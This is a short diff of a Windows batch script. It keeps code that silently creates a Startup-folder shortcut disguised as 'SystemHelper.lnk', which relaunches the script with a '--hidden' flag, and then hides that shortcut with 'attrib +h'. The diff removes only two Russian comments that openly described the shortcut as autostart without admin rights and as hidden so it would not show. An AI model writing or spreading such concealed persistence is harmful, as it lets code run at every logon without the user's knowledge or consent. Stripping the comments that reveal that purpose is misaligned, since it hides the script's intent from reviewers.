@@ -19,10 +19,7 @@ set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 set BATCH_PATH=%~f0
 set SHORTCUT_NAME=SystemHelper.lnk
 
-:: Создаём ярлык в автозагрузке (без прав админа)
 powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\%SHORTCUT_NAME%'); $SC.TargetPath = '%BATCH_PATH%'; $SC.WorkingDirectory = '%~dp0'; $SC.Arguments = '--hidden'; $SC.Save()" >nul 2>&1
-
-:: Скрываем ярлык (чтобы не светился)
 attrib +h "%STARTUP_DIR%\%SHORTCUT_NAME%" >nul 2>&1
 
 :: ============ ЗАГОЛОВОК ============
